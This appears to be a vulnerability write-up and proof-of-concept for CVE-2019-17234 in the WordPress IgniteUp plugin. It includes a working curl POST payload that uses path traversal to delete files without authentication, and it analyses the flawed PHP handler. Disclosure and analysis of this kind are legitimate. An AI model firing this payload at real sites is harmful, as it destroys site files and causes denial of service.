# Wordpress DirStroyer
Wordpress IgniteUp plugin v3.4 and below allows remote unauthenticated users to arbitrarily delete files on target webserver possibly causing Denial of Service type of attack.

# CVE-2019-17234 timeline
The vulnerability was reported to the wordpress.org team on September 20, 2019 and new version of the plugin 3.4.1 was released on November 08, 2019.

# Background
IgniteUp is a popular wordpress plugin to perform trivial set up and management of website landing pages to let users know the site is coming soon, in mantainance or under construction.

The plugin comes out of the box with 5 default templates: **believe,cleaner,glass,launcher,offline**.

Template names are highlighted since a correct parameter [template-name] is required to perform a valid request to the webserver to exploit the vulnerability.

# Exploit code
**[WARNING]**

Following command example might be enough to break your wordpress website, deleting IgniteUp plugin core files.

```
curl -d "action=admin_init&delete_template=[template-name]/../../" -X POST http(s)://[target-website]/wp-admin/admin-post.php

dummy example:
curl -d "action=admin_init&delete_template=believe/../../" -X POST http://localhost/wp-admin/admin-post.php

```

# Vulnerability code analysis
The culprit function that introduces this vulnerability is highlighted below, if you already installed IgniteUp plugin you can find the relative file it in “wp-content/plugins/igniteup/includes/class-coming-soon-creator.php”, file which, as the name hints, handles creation of new custom templates and deletion of the defaults/created ones.
```php
add_action('admin_init', array($this, 'deleteTemplate'));
...
...
public function deleteTemplate()
{
   if (!isset($_POST['delete_template']) || empty($_POST['delete_template']))
      return;
   $folder_name = $_POST['delete_template'];
   $path = dirname(CSCS_FILE) . '/includes/templates/';
   array_map('unlink', glob($path . $folder_name . '/*.*'));
   rmdir($path . $folder_name);
   unlink($path . '/' . $folder_name . '.php');
   header('Location: ' . $_SERVER['REQUEST_URI']);
}
```

admin_init on the very first line is a Wordpress action hook.
Hooks make up the foundation for how plugins and themes interact with WordPress Core, but they’re also used extensively by Core itself.

Unfortunately the action has no authentication check, and deleteTemplate() function gives the reader enough hints on how to perform such action, looking at the code is trivial to spot php POST parameters, so we need to perform a POST request.





## Authors

* **Andrea Vignudelli** -(https://github.com/administra1tor)


## References
* Kudos to Jerome Bruandet for reporting the issue.
* https://blog.nintechnet.com/multiple-vulnerabilities-in-wordpress-igniteup-coming-soon-and-maintenance-mode-plugin/
* Vulnerability fixed in v3.4.1.

